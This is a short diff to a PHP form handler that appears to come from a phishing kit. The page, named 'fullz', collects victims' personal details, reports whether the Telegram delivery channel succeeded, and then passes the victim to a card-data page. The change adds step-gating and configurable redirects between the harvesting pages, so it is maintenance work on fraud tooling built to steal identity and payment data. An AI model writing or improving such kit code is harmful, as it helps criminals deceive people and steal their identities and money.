@@ -2,6 +2,11 @@
 include '../settings.php';
 include 'functions.php';
 
+if (!h4z3_is_step_active('fullz')) {
+    header('Location: ' . h4z3_get_first_step_path('../'));
+    exit;
+}
+
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $fName = $_POST['fname'];
@@ -56,16 +61,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             h4z3_mark_channel_failure('telegram_failed');
         }
         }
-
-        
-        if($debitpage == "on"){
-          header('Location: ../card.php');
-          exit;
-        }
-        else{
-          header('Location: ../complete.php');
-          exit;
-        }
+        $nextStep = h4z3_get_next_step_path('fullz', '../');
+        header('Location: ' . $nextStep);
+        exit;
 
 }
 ?>
